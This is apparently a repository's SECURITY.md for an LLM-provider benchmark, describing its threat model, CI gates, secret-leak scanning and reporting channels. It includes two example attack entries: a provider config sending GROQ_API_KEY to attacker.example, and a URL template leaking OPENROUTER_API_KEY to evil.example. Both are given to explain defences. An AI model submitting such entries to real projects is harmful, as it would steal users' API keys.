# Security

## What this repo can do to your machine

**Nothing you have not asked it to.** Stated concretely, so you can check rather than trust:

- **Zero dependencies.** Python standard library only. No `pip install`, no `requirements.txt`, no
  lockfile, no transitive package that can be taken over next month. This is the single most important
  security property here, and any pull request that adds a dependency has to justify itself against it.
- **No `eval`, no `exec`, no `pickle`, no `shell=True`.** Grep for them. Every child process is a list of
  arguments, never a shell string, and this is the complete set: the publication gate runs `git ls-files`
  to learn which files git would ignore, and in `--history` mode `git log --all --reflog -p` to read every
  commit still reachable; the pull-request gate runs `git rev-parse`, `git diff --name-status` and
  `git show` to read the two sides of a pull request; the test runners spawn the scripts they test with
  the interpreter that is running them, and `test_gate.py` and `test_pr.py` build scratch git
  repositories (`git init`, `add`, `commit`, `rm`, `checkout`) inside a temporary directory to exercise
  the history mode and the pull-request diff. Nothing else forks, and nothing forks anything it found
  in data.
- **It sends HTTP requests only to the hosts listed in code**, in
  `ALLOWED_HOSTS` in [`bench/gate_contributions.py`](bench/gate_contributions.py). `benchmark.py`
  refuses any other destination at request time, and a redirect that changes host is refused too,
  because the Authorization header would travel with it.
- **It writes files only where you tell it** (`--out`), plus the language pack it reads by code, and
  that code is validated against `[a-z]{2,8}` before it is put in a path.
- **Your API keys are read from environment variables and go into exactly one place**: the
  `Authorization` header of a request to one of those hosts. They are never written to a file,
  never logged, and provider error bodies are redacted before anything is saved.

## The attack this repo is actually shaped like

Worth naming, because it is not obvious and it is the reason for half the checks:

`benchmark.py` reads **both** the endpoint URL and the name of the environment variable holding the API
key out of [`bench/providers.json`](bench/providers.json) — and [CONTRIBUTING.md](CONTRIBUTING.md)
invites strangers to add providers by editing exactly that file. A pull request adding

```json
{"name": "fastllm", "url": "https://attacker.example/v1/chat/completions", "key_env": "GROQ_API_KEY"}
```

would make everyone who runs the battery send their real Groq key to a server the contributor controls.
It needs no exploit. It needs a merge.

What stops it is checked by [`bench/gate_contributions.py`](bench/gate_contributions.py) on every
pull request, and every rule below has a planted pull request in `bench/test_contributions.py` that it must
refuse, next to an honest one it must admit:

1. **A key variable is bound to one host, and one role, in a committed registry, and an existing line of
   that registry is never edited in a pull request.**
   [`bench/key_bindings.json`](bench/key_bindings.json) lists every key variable with the one host and the
   one role it may serve, and the contribution gate checks `providers.json` against it. The binding used
   to be rebuilt from `providers.json` on every run, which meant a pull request that exchanged the URLs
   of existing providers, key variables untouched, produced no finding and would have sent each runner's
   key to the other host. A registry alone only moves the problem: a pull request that swaps two URLs and
   swaps the two registry lines to match still shows the content gate one key per host. So
   [`bench/gate_pr.py`](bench/gate_pr.py) reads the diff instead of the content: an entry that exists on
   `main` in the registry, in `providers.json` or in the host maps of the contribution gate may not
   change or disappear in a pull request, only be added next to, and two existing lines changed is a
   refusal before anyone reads what they say. A provider may never claim a judge's key, a judge may never
   claim a provider's, and adding a provider means adding its line in the registry, in the same pull
   request, where a reviewer sees both. Removing one is a separate pull request whose title starts with
   `retire:`.
2. **Destinations live in code, not in data.** A JSON-only pull request cannot add a host. Adding one is
   an edit to the gate, in the same PR, where a reviewer sees it. The URL path must be the one shape the
   runner speaks, so a key cannot be aimed at another endpoint of an allowed host either.
3. **A provider may not claim another provider's key variable.** Legitimate exceptions (Google issues
   `GEMINI_API_KEY`, Cloudflare uses `CF_API_TOKEN`) are declared in the gate, in code.
4. **Only `CF_ACCOUNT_ID` may be interpolated into a URL, and only on Cloudflare's host.** Otherwise a path
   like `https://evil.example/{OPENROUTER_API_KEY}/` would leak a second key in plain text.
5. **Nothing a contributor writes reaches the request body unchecked.** `extra_body` and a language pack's
   `generation` block may not carry `model`, `messages`, `max_tokens`, `n`, `stream` or tools; timeouts,
   pacing, token caps and model counts have bounds; model ids have a shape. Without this, a JSON-only
   pull request could send any prompt to any model on every runner's key.
6. **Every figure the page generator reads is typed and sourced.** Rate limits must be non-negative
   integers or null, a DECLARED figure needs an https source and a date, a MEASURED one a date and how it
   was measured, and the radar, throughput and retirement files have a shape. Without this, a one-line
   edit to a data file put any number on the front page.
7. **A redirect may not change host, scheme or port.** `bench/http_safe.py` refuses it, because the
   Authorization header would travel with it; the test greps every key-carrying script for the guard.
8. **A sustained draw is checked against what the program that wrote it could have written.**
   `data/drawn.jsonl` carries the largest single figure on the front-page bar, multiplied out to a day,
   and it is committed by the daily job with write rights, so one appended row was the shortest path to
   a false front page. The gate now reads that file by the rules of `bench/draw_day.py` itself: the
   provider and model must be ones the catalogue knows, the date may not be in the future, the hourly
   rate must follow from the tokens drawn over the minutes actually run, and both the pace and the token
   count must sit under the ceilings the program enforces on itself. A row that `draw_day.py` could not
   have produced is refused before `rank.py` ever multiplies it.

The same host and placeholder checks run again inside `benchmark.py` at request time, for anyone running a
modified `providers.json` on their own machine.

## What may not leave the tree

[`bench/gate_publish.py`](bench/gate_publish.py) scans everything git would publish, and its test plants
a hundred and seventy-odd leaks of every shape it knows and asserts the exact rule that catches each: keys
with and without a vendor prefix, keys wrapped over two lines, tokens after any assignment, base64 after an
assignment or an echo, URL-encoded and HTML-entity forms, paths of every operating system including
network shares, public addresses of both IP families, real e-mail addresses, co-author trailers and other
tool traces from every common vendor, first-person statements about the state of an account and echoes of
its rate-limit headers, a rate limit multiplied across keys, and text hidden in files that look binary,
deflated archives included. Two things about it are worth knowing:

- **The private names it hunts are not in the repo.** They live in a local, git-ignored `.gate-private`;
  the repo ships only truncated fingerprints in `bench/private_fingerprints.json`, so CI can still catch a
  name it cannot read. `.gate-private.example` shows the format.
- **`--history` scans every commit ever made, messages and authors included.** The working-tree mode runs
  in CI on every push and pull request; the history mode runs in CI on every pull request as well, on a
  full-depth checkout, so a key or an account state in a contributor's commit message, author or
  committer field is refused before it can merge. It is still run by hand before a push, because a leak
  that was committed once stays in the history until the history is rewritten.

## Where the measurements come from

Nothing that measures runs in CI, because CI never holds a key. The liveness probe behind the Answers
column and the 30-second burst meter run once a day, and the 60-minute draw behind the DRAWN label once
a week, all from one machine that holds the keys; the archived benchmark runs under `results/` were made
the same way. That machine pushes what it measured to `main`. The dates inside those files are the only
record of when a meter actually ran; a cadence stated here and absent there is a promise, not a fact.
The daily job in `.github/workflows/daily-catalog.yml` holds no key either: it re-reads the public
catalogues, refreshes the imported scores through the drift gate, recomputes reliability from
`results/` and regenerates the pages.

**Measurements are made, never contributed.** `data/uptime.jsonl`, `data/uptime-superseded.jsonl`,
`data/throughput.jsonl`, `data/drawn.jsonl`, `data/reliability.json`, `data/scores.json`,
`data/scores-drift.jsonl`, `data/catalog.json` and everything under `results/` are written only by
those meters and by that job. A pull request that adds, changes, moves or deletes a line in any of them
is refused by [`bench/gate_pr.py`](bench/gate_pr.py), whatever the line says. The content gates above
still read every row, because the machine that measures can be wrong too; this gate is for the row a
content gate would have believed. The same gate lets a pull request add to `bench/key_bindings.json`,
`bench/providers.json` and the host maps and never edit or remove what is there; a removal is admitted
only in a pull request whose title starts with `retire:`.

## What runs in CI, on every pull request

On a pull request the first step is that structural wall, run from the base branch's copy of the gate,
so a pull request that edits `bench/gate_pr.py` is still checked by the gate `main` has. Then every gate
is tested in both directions before it is trusted with anything: the test files plant what must be
refused next to what must be admitted. Then the gates run on what is actually committed, and the
generator is run again on the committed data with the demand that it changes nothing.

| Check | What it refuses |
|---|---|
| `bench/gate_pr.py`, first, from the base branch's copy, on pull requests | a line added, changed, moved or deleted in a measurement file (the list is in the section above), or an entry that exists on `main` in `bench/key_bindings.json`, `bench/providers.json` or the host maps of `bench/gate_contributions.py` that is changed or, without a `retire:` title, removed |
| `bench/test_probes.py`, `test_gate.py`, `test_pr.py`, `test_contributions.py`, `test_scores.py`, `test_jury.py`, `test_drift.py`, `test_viability.py`, `test_rank.py`, `test_draw.py`, `test_claims.py` | a checker or a gate that has drifted, in either direction |
| `bench/test_shelf.py` | a headline that bench/rank.py computed but bench/limits.json and data/drawn.jsonl cannot justify: the four shelves are re-added here, figure by figure, with the generator out of the loop |
| `bench/gate_publish.py`, on the tree and, on pull requests, `--history` | an API key, an account's state in the first person, a private path or name, a tool trace, a rate limit multiplied across keys; in history mode the same things in every commit the pull request brings, its message, author and committer included |
| `bench/gate_contributions.py` | a contributed provider, judge, language pack, limit, privacy claim, retirement notice or data row that the rules above refuse; a key variable that does not match the registry; a daily figure above the project's target, or above 100,000,000 without a measurement; a back-dated or doubled radar or draw row; a burst row with more requests than its slots could complete; a judge from a benchmarked family; and an archived reliability run that does not recompute from results/ |
| `bench/gate_drift.py --check` | imported scores that are not numeric, outside their scale, dated in the future, flattened to one value across distinct models, older than fourteen days, drifted past the bounds since the committed file, equal to `data/scores.rejected.json`, or not the file the gate last applied |
| `bench/gate_claims.py`, on the committed pages | on every markdown file git tracks (minus the generator's golden blocks): a score figure, answer cell, ranked order, label, door, link, generated-block marker, prose count or SOURCES.md number that is not what the data says, and any ranking-shaped table or door on a page the generator does not write; its CLEAN line names each check with the number of items it verified and lists none that verified nothing |
| `bench/gate_claims.py --list-pages` against `git ls-files '*.md'` | a tracked Markdown page, outside the GitHub templates, the test fixtures and the archived runs, that the claims gate does not open |
| `bench/gate_viability.py` | an uptime history with two readings for one endpoint-day |
| regeneration, then `git diff --exit-code` | a page edited by hand, or data edited without regenerating the pages |
| `bench/gate_claims.py`, again on the regenerated pages | a claim the generator itself would publish that is not in the data |

CI runs on `pull_request`, never `pull_request_target`, so code from a fork runs without access to any
secret and without write permission, and it makes no network call: the quality scores it ranks with are
the committed snapshot. The daily job has `contents: write` because it commits the catalogue diff and the
regenerated pages; it fetches the scores into a temporary file and lets `gate_drift.py` decide whether
they may replace the committed ones, and it pushes only the one commit it made, after rebasing onto
whatever landed while it ran and running the gates again on the rebased tree. Every path in the repo has
an owner in `.github/CODEOWNERS`.

## Reporting something

Open a [security advisory](../../security/advisories/new), or a normal issue if it is not sensitive.

We would genuinely rather hear that a gate has a hole than believe it does not. If you find one, the
most useful report is a failing case added to the test file of the gate concerned — that way the hole
cannot come back quietly, which is how it got there in the first place.

**Please do not** open pull requests containing real API keys, even expired ones, even as test data. Use
the shape-only fakes in `bench/test_gate.py` as a model. GitHub's push protection is enabled on this
repo and will block most of them, but not all.

## What we do not claim

- We have not audited the providers. Sending them a prompt means trusting them with that prompt.
- The published results contain model outputs. They were generated from our prompts, but a language
  model can produce anything, and we do not vouch for the content of a paragraph a model wrote.
- The gates here are written by the same people who wrote the code they check. That is a real
  limitation, and the reason every gate is tested in both directions rather than merely run.
